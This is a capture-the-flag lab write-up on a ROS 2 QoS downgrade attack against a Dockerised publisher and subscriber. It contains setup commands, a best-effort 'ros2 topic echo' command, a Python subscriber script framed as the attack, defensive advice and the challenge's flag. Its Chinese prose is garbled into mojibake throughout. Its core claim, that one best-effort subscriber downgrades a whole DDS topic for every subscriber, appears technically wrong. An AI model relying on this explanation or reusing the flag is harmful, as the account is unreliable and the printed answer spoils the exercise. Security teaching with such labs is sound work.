# ROS 2 QoS é™çº§æ”»å‡»ï¼ˆLab4)

> **Level 4ï¼šQoS é™çº§æ”»å‡»**

> æ”»å‡»ç›®æ ‡ï¼šé€šè¿‡å‘½ä»¤è¡Œæ–¹å¼è¿›è¡Œ QoS é™çº§æ”»å‡»ï¼Œä½¿å‘å¸ƒè€…å¯¹è®¢é˜…è€…å‘é€çš„ä¿¡æ¯äº§ç”Ÿä¸¢åŒ…ï¼Œè§¦å‘è®¢é˜…è€…èŠ‚ç‚¹è¾“å‡º Flagã€‚

---

# 1. é¶åœºèƒŒæ™¯

æ­¤æ¬¡æ¸—é€æµ‹è¯•çš„ç›®æ ‡ä¸º **Quiksand Lab4** çŽ¯å¢ƒï¼Œæ ¸å¿ƒå›´ç»• ROS 2 ç³»ç»Ÿçš„ QoS é™çº§æ”»å‡»æ¼æ´žå±•å¼€ã€‚

åœ¨é»˜è®¤é…ç½®ä¸‹ï¼š

- å‘å¸ƒè€…èŠ‚ç‚¹åœ¨ `/Publisher` è¯é¢˜ä¸Šå‘å¸ƒä¿¡æ¯ï¼Œä½¿ç”¨é«˜å¯é æ€§ QoS é…ç½®
- è®¢é˜…è€…èŠ‚ç‚¹è®¢é˜… `/Publisher` è¯é¢˜ï¼Œå½“æ£€æµ‹åˆ°ä¸¢åŒ…æ—¶è¾“å‡º Flag
- ROS 2 èŠ‚ç‚¹åŸºäºŽ DDS åè®®é€šä¿¡ï¼Œé»˜è®¤å¼€å¯ QoS åå•†æœºåˆ¶

è¿™æ„å‘³ç€ï¼š

> **ä»»ä½•ä½¿ç”¨ä½Žå¯é æ€§ QoS é…ç½®è®¢é˜…åŒä¸€è¯é¢˜çš„æ“ä½œï¼Œéƒ½å¯èƒ½å¯¼è‡´ QoS åå•†é™çº§ï¼Œäº§ç”Ÿä¸¢åŒ…ï¼Œè§¦å‘ Flag è¾“å‡ºã€‚**

åœ¨çœŸå®žæœºå™¨äººç³»ç»Ÿä¸­ï¼Œå¦‚æžœå…³é”®æŽ§åˆ¶è¯é¢˜çš„ QoS è¢«æ¶æ„é™çº§ï¼Œå°†å¯¼è‡´æŽ§åˆ¶æŒ‡ä»¤ä¸¢å¤±ã€æœºå™¨äººè¡Œä¸ºå¼‚å¸¸ç”šè‡³å®‰å…¨äº‹æ•…ç­‰é£Žé™©ã€‚

---

# 2. æ”»å‡»åœºæ™¯è¯´æ˜Ž

## 2.1 ç³»ç»Ÿè§’è‰²

|è§’è‰²|è¯´æ˜Ž|
|---|---|
|å‘å¸ƒè€…èŠ‚ç‚¹|ç›®æ ‡èŠ‚ç‚¹ï¼Œè¿è¡ŒäºŽ Docker å®¹å™¨å†…ï¼Œåœ¨ `/Publisher` è¯é¢˜ä¸Šå‘å¸ƒä¿¡æ¯ï¼Œä½¿ç”¨é«˜å¯é æ€§ QoS é…ç½®|
|è®¢é˜…è€…èŠ‚ç‚¹|ç›‘æŽ§èŠ‚ç‚¹ï¼Œè¿è¡ŒäºŽ Docker å®¹å™¨å†…ï¼Œè®¢é˜… `/Publisher` è¯é¢˜ï¼Œå½“æ£€æµ‹åˆ°ä¸¢åŒ…æ—¶è¾“å‡º Flag|
|æ”»å‡»è€…ï¼ˆçº¢é˜Ÿï¼‰|å®¿ä¸»æœº/å®¹å™¨å†…æ”»å‡»è€…ï¼Œé€šè¿‡å‘½ä»¤è¡Œæ–¹å¼è¿›è¡Œ QoS é™çº§æ”»å‡»|
---

## 2.2 æ”»å‡»ç›®æ ‡

- ðŸŽ¯ ç›®æ ‡ï¼šä½¿å‘å¸ƒè€…å¯¹è®¢é˜…è€…å‘é€çš„ä¿¡æ¯äº§ç”Ÿä¸¢åŒ…

- ðŸŽ¯ åè®®/å·¥å…·ï¼šDDS åè®®ã€ROS 2 å‘½ä»¤è¡Œå·¥å…·ã€Docker

- ðŸŽ¯ æ•ˆæžœï¼š
        
    - è§¦å‘è®¢é˜…è€…èŠ‚ç‚¹è¾“å‡º Flag
    - éªŒè¯é€šè¿‡å‘½ä»¤è¡Œè¿›è¡Œ QoS é™çº§æ”»å‡»çš„å¯è¡Œæ€§
    - äº†è§£ DDS QoS åå•†æœºåˆ¶çš„å®‰å…¨éšæ‚£

---

# 3. é¶åœºå¯åŠ¨æ–¹å¼

åœ¨ `lab4` ç›®å½•ä¸‹æž„å»ºå¹¶å¯åŠ¨é¶åœºï¼š

```bash
docker build -t rctf_lab4 .
docker run -it --name rctf_lab4_container rctf_lab4
```

å¯åŠ¨æˆåŠŸåŽï¼Œå®¹å™¨å†…ä¼šè‡ªåŠ¨ï¼š

- source ROS 2 çŽ¯å¢ƒ
- å¯åŠ¨å‘å¸ƒè€…èŠ‚ç‚¹ï¼Œå¼€å§‹åœ¨ `/Publisher` è¯é¢˜ä¸Šå‘å¸ƒä¿¡æ¯
- å¯åŠ¨è®¢é˜…è€…èŠ‚ç‚¹ï¼Œå¼€å§‹ç›‘æŽ§ `/Publisher` è¯é¢˜çš„æ¶ˆæ¯
- ç›´æŽ¥è¿›å…¥äº¤äº’ shellï¼Œæç¤ºèŠ‚ç‚¹å¯åŠ¨æˆåŠŸ

---

# 4. åšé¢˜æ€è·¯

## 4.1 æ€è·¯ï¼šå‘½ä»¤è¡Œ QoS é™çº§æ”»å‡»

> æœ€ç›´æŽ¥çš„æ–¹æ³•ï¼Œé€šè¿‡å‘½ä»¤è¡Œå·¥å…·ä½¿ç”¨ä½Žå¯é æ€§ QoS é…ç½®è®¢é˜… `/Publisher` è¯é¢˜ï¼Œè§¦å‘ QoS åå•†é™çº§ã€‚

### 4.1.1 æ“ä½œæ­¥éª¤

1. **å¯åŠ¨å®¹å™¨**ï¼šæŒ‰ç…§ä¸Šè¿°æ­¥éª¤å¯åŠ¨ lab4 å®¹å™¨

2. **æŸ¥çœ‹è¯é¢˜åˆ—è¡¨**ï¼ˆç¡®è®¤ `/Publisher` å­˜åœ¨ï¼‰ï¼š
   ```bash
   ros2 topic list
   ```

3. **æ‰§è¡Œ QoS é™çº§æ”»å‡»**ï¼š
   ```bash
   ros2 topic echo /Publisher --qos-reliability best_effort --qos-history keep_last --qos-depth 1
   ```

4. **è§‚å¯Ÿ Flag è¾“å‡º**ï¼šå½“æ”»å‡»æˆåŠŸæ—¶ï¼Œè®¢é˜…è€…èŠ‚ç‚¹ä¼šæ£€æµ‹åˆ°ä¸¢åŒ…ï¼Œå¹¶è¾“å‡º Flag ä¿¡æ¯ã€‚

### 4.1.2 åŽŸç†è¯´æ˜Ž

- **å‘å¸ƒè€… QoS é…ç½®**ï¼šä½¿ç”¨é«˜å¯é æ€§ QoS é…ç½®ï¼ˆRELIABLE/KEEP_ALLï¼‰
- **æ”»å‡»è€… QoS é…ç½®**ï¼šä½¿ç”¨ä½Žå¯é æ€§ QoS é…ç½®ï¼ˆBEST_EFFORT/KEEP_LAST/1ï¼‰
- **QoS åå•†æœºåˆ¶**ï¼šDDS åè®®ä¼šè¿›è¡Œ QoS åå•†ï¼Œæœ€ç»ˆé™çº§åˆ°æ‰€æœ‰è®¢é˜…è€…éƒ½èƒ½æ”¯æŒçš„æœ€ä½Ž QoS çº§åˆ«
- **ä¸¢åŒ…æ£€æµ‹**ï¼šå½“ QoS é™çº§åŽï¼Œæ¶ˆæ¯å¯èƒ½ä¸¢å¤±ï¼Œè®¢é˜…è€…èŠ‚ç‚¹æ£€æµ‹åˆ°ä¸¢åŒ…å¹¶è¾“å‡º Flag

## 4.2 æ€è·¯ï¼šåˆ›å»ºä½Žå¯é æ€§è®¢é˜…è€…èŠ‚ç‚¹

> æ›´çµæ´»çš„æ–¹æ³•ï¼Œé€šè¿‡åˆ›å»ºè‡ªå®šä¹‰è®¢é˜…è€…èŠ‚ç‚¹ï¼Œä½¿ç”¨ä½Žå¯é æ€§ QoS é…ç½®è®¢é˜… `/Publisher` è¯é¢˜ã€‚

### 4.2.1 æ“ä½œæ­¥éª¤

1. **åˆ›å»ºæµ‹è¯•è„šæœ¬**ï¼š
   ```python
   # qos_attack.py
   import rclpy
   from rclpy.node import Node
   from std_msgs.msg import String

   class QoSAttackNode(Node):
       def __init__(self):
           super().__init__('qos_attack_node')
           # ä½¿ç”¨ä½Žå¯é æ€§ QoS é…ç½®
           qos_profile = rclpy.qos.QoSProfile(
               reliability=rclpy.qos.ReliabilityPolicy.BEST_EFFORT,
               history=rclpy.qos.HistoryPolicy.KEEP_LAST,
               depth=1
           )
           # è®¢é˜… /Publisher è¯é¢˜
           self.subscription = self.create_subscription(
               String,
               '/Publisher',
               self.listener_callback,
               qos_profile
           )
           self.get_logger().info('QoS attack node started with BEST_EFFORT reliability')

       def listener_callback(self, msg):
           self.get_logger().info(f'Received: {msg.data}')

   def main(args=None):
       rclpy.init(args=args)
       node = QoSAttackNode()
       rclpy.spin(node)
       node.destroy_node()
       rclpy.shutdown()

   if __name__ == '__main__':
       main()
   ```

2. **è¿è¡Œè„šæœ¬**ï¼š
   ```bash
   python3 qos_attack.py
   ```

3. **è§‚å¯Ÿ Flag è¾“å‡º**ï¼šå½“æ”»å‡»æˆåŠŸæ—¶ï¼Œè®¢é˜…è€…èŠ‚ç‚¹ä¼šæ£€æµ‹åˆ°ä¸¢åŒ…ï¼Œå¹¶è¾“å‡º Flag ä¿¡æ¯ã€‚

### 4.2.2 åŽŸç†è¯´æ˜Ž

- **è‡ªå®šä¹‰ QoS é…ç½®**ï¼šåˆ›å»ºä½¿ç”¨ BEST_EFFORT å¯é æ€§çº§åˆ«çš„è®¢é˜…è€…èŠ‚ç‚¹
- **QoS åå•†æœºåˆ¶**ï¼šDDS åè®®ä¼šæ£€æµ‹åˆ°æ–°çš„è®¢é˜…è€…ï¼Œå¹¶è¿›è¡Œ QoS åå•†
- **é™çº§æ•ˆæžœ**ï¼šç”±äºŽæ–°è®¢é˜…è€…åªæ”¯æŒ BEST_EFFORT å¯é æ€§ï¼Œæ•´ä¸ªè¯é¢˜çš„ QoS ä¼šè¢«é™çº§
- **ä¸¢åŒ…è§¦å‘**ï¼šQoS é™çº§åŽï¼Œæ¶ˆæ¯å¯èƒ½ä¸¢å¤±ï¼Œè®¢é˜…è€…èŠ‚ç‚¹æ£€æµ‹åˆ°ä¸¢åŒ…å¹¶è¾“å‡º Flag

---

# 5. æ”»å‡»åŽŸç†

## 5.1 QoS åå•†æœºåˆ¶

- **QoS å®šä¹‰**ï¼šQuality of Serviceï¼ˆæœåŠ¡è´¨é‡ï¼‰æ˜¯ DDS åè®®ä¸­å®šä¹‰çš„ä¸€ç»„å‚æ•°ï¼Œç”¨äºŽæŽ§åˆ¶æ•°æ®ä¼ è¾“çš„å¯é æ€§ã€æ—¶æ•ˆæ€§ç­‰ç‰¹æ€§
- **å¯é æ€§çº§åˆ«**ï¼š
  - RELIABLEï¼šå¯é ä¼ è¾“ï¼Œç¡®ä¿æ¶ˆæ¯ä¸€å®šé€è¾¾
  - BEST_EFFORTï¼šå°½åŠ›è€Œä¸ºä¼ è¾“ï¼Œä¸ä¿è¯æ¶ˆæ¯ä¸€å®šé€è¾¾
- **åŽ†å²è®°å½•ç­–ç•¥**ï¼š
  - KEEP_ALLï¼šä¿ç•™æ‰€æœ‰æ¶ˆæ¯
  - KEEP_LASTï¼šåªä¿ç•™æœ€è¿‘çš„ N æ¡æ¶ˆæ¯

## 5.2 æ”»å‡»æœ¬è´¨

> **DDS QoS åå•†æœºåˆ¶çš„å®‰å…¨éšæ‚£è¢«åˆ©ç”¨**

å½“å¤šä¸ªè®¢é˜…è€…è®¢é˜…åŒä¸€è¯é¢˜æ—¶ï¼š

- DDS åè®®ä¼šè¿›è¡Œ QoS åå•†ï¼Œé€‰æ‹©æ‰€æœ‰è®¢é˜…è€…éƒ½èƒ½æ”¯æŒçš„æœ€ä½Ž QoS çº§åˆ«
- æ”»å‡»è€…ä½¿ç”¨ä½Žå¯é æ€§ QoS é…ç½®è®¢é˜…è¯é¢˜ï¼Œå¼ºåˆ¶æ•´ä¸ªè¯é¢˜çš„ QoS é™çº§
- é™çº§åŽï¼Œæ¶ˆæ¯å¯èƒ½ä¸¢å¤±ï¼Œè§¦å‘è®¢é˜…è€…èŠ‚ç‚¹çš„ä¸¢åŒ…æ£€æµ‹é€»è¾‘

æ— éœ€ç»•è¿‡ä»»ä½•é˜²æŠ¤ï¼Œç›´æŽ¥åˆ©ç”¨ DDS QoS åå•†æœºåˆ¶çš„è®¾è®¡ç‰¹æ€§ï¼Œå³å¯å®Œæˆæ”»å‡»ã€‚

---

# 6. é˜²å®ˆæ–¹å‘

è¯¥é¶åœºå¯ç”¨äºŽéªŒè¯ä»¥ä¸‹é˜²å¾¡æŽªæ–½ï¼ŒåŠ å›º ROS 2 èŠ‚ç‚¹å®‰å…¨ï¼ŒæŠµå¾¡ QoS é™çº§æ”»å‡»ï¼š

- **QoS ç­–ç•¥ç®¡ç†**ï¼šä¸ºå…³é”®è¯é¢˜é…ç½®åˆé€‚çš„ QoS ç­–ç•¥ï¼Œé¿å…è¿‡åº¦ä¾èµ–é«˜å¯é æ€§
- **æ¶ˆæ¯æ ¡éªŒæœºåˆ¶**ï¼šåœ¨åº”ç”¨å±‚å®žçŽ°æ¶ˆæ¯æ ¡éªŒå’Œé‡ä¼ æœºåˆ¶ï¼Œä¸ä¾èµ–åº•å±‚ QoS ä¿è¯
- **è®¿é—®æŽ§åˆ¶**ï¼šé™åˆ¶å¯¹æ•æ„Ÿè¯é¢˜çš„è®¢é˜…æƒé™ï¼Œé˜²æ­¢æœªæŽˆæƒèŠ‚ç‚¹å½±å“ QoS åå•†
- **ç›‘æŽ§å‘Šè­¦**ï¼šç›‘æŽ§è¯é¢˜çš„ QoS çº§åˆ«å˜åŒ–ï¼ŒåŠæ—¶å‘çŽ°å¼‚å¸¸çš„ QoS é™çº§
- **ç½‘ç»œéš”ç¦»**ï¼šä½¿ç”¨ç½‘ç»œéš”ç¦»æŠ€æœ¯ï¼Œé˜²æ­¢å¤–éƒ¨èŠ‚ç‚¹æŽ¥å…¥æ•æ„Ÿè¯é¢˜çš„é€šä¿¡

å¼€å¯é˜²å®ˆåŽï¼š

> æ”»å‡»è€…æ— æ³•é€šè¿‡ QoS é™çº§æ”»å‡»å½±å“å…³é”®è¯é¢˜çš„é€šä¿¡è´¨é‡ï¼Œè®¢é˜…è€…èŠ‚ç‚¹çš„ Flag è¾“å‡ºå°†å—åˆ°ä¿æŠ¤ã€‚

---

# 7. Flag

å½“ QoS é™çº§æ”»å‡»æˆåŠŸï¼Œè®¢é˜…è€…èŠ‚ç‚¹æ£€æµ‹åˆ°ä¸¢åŒ…æ—¶ï¼Œä¼šè¾“å‡ºï¼š

```text
flag{Quiksand_lab4_downgrade_004}
```

---

# 8. é€‚ç”¨åœºæ™¯

- ROS 2 å®‰å…¨æ•™å­¦ï¼ˆQoS é™çº§æ”»å‡»åŽŸç†è®²è§£ï¼‰
- æœºå™¨äººå®‰å…¨å®žéªŒï¼ˆQoS ç­–ç•¥é˜²æŠ¤æŽªæ–½éªŒè¯ï¼‰
- CTF æ”»é˜²é¶åœºï¼ˆROS 2 ä¸“é¡¹é¢˜åž‹è®¾è®¡ï¼‰
- ç ”ç©¶ç”Ÿ/æœ¬ç§‘è¯¾ç¨‹å®žéªŒï¼ˆåµŒå…¥å¼/æœºå™¨äººå®‰å…¨æ–¹å‘ï¼‰

---

**Author**: ROS 2 Security Lab

**Level**: Intermediate / Offensive
> 
